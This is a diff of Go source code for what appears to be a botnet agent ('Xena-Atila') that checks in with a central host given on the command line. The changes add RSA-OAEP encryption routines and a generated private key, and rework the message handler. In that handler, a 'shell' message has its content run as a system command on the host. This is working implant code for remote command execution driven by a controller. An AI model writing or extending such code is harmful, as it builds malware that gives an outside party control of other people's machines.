@@ -2,6 +2,9 @@ package main
 
 import (
 	"bytes"
+	cryptoRand "crypto/rand"
+	"crypto/rsa"
+	"crypto/sha256"
 	"encoding/base64"
 	"encoding/json"
 	"errors"
@@ -22,8 +25,40 @@ import (
 // Xena-Atila.
 var centralizedHost string = os.Args[1]
 
+/* CONFIGURATION */
 // Generate the unique identifier.
 var id uuid.UUID = uuid.New()
+var privateKey = generatePrivateKey()
+
+// Generates a private key.
+func generatePrivateKey() *rsa.PrivateKey {
+	secret, err := rsa.GenerateKey(cryptoRand.Reader, 4096)
+	if err != nil {
+		fmt.Println(err)
+	}
+	return secret
+}
+
+func encryptRSAOAEP(secretMessage string, key rsa.PublicKey) string {
+	label := []byte("OAEP Encrypted")
+	rng := cryptoRand.Reader
+	ciphertext, err := rsa.EncryptOAEP(sha256.New(), rng, &key, []byte(secretMessage), label)
+	if err != nil {
+		fmt.Println(err)
+	}
+	return base64.StdEncoding.EncodeToString(ciphertext)
+}
+
+func decryptRSAOAEP(cipherText string, privKey rsa.PrivateKey) string {
+	ct, _ := base64.StdEncoding.DecodeString(cipherText)
+	label := []byte("OAEP Encrypted")
+	rng := cryptoRand.Reader
+	plaintext, err := rsa.DecryptOAEP(sha256.New(), rng, &privKey, ct, label)
+	if err != nil {
+		fmt.Println(err)
+	}
+	return string(plaintext)
+}
 
 /* Internet Address. */
 type InternetAddress struct {
@@ -258,12 +293,14 @@ func interpretMessages(messages []Message) {
 			continue
 		}
 
+		decodedContentStr := string(decodedContent[:])
+
 		fmt.Print("New command: ")
-		fmt.Println(decodedContent)
+		fmt.Println(decodedContentStr)
 
 		switch message.Subject {
 		case "shell":
-			cmd := exec.Command(strings.TrimSuffix(string(decodedContent[:]), "\n"))
+			cmd := exec.Command(strings.TrimSuffix(decodedContentStr, "\n"))
 			var out bytes.Buffer
 			cmd.Stdout = &out
 
